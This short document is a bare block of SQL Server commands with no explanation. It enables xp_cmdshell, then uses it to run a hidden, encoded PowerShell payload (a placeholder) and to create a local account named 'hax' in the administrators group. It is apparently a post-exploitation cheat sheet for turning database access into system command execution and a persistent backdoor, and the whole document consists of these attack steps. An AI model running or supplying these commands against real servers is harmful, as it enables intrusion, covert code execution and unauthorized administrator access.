```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';
EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add';
```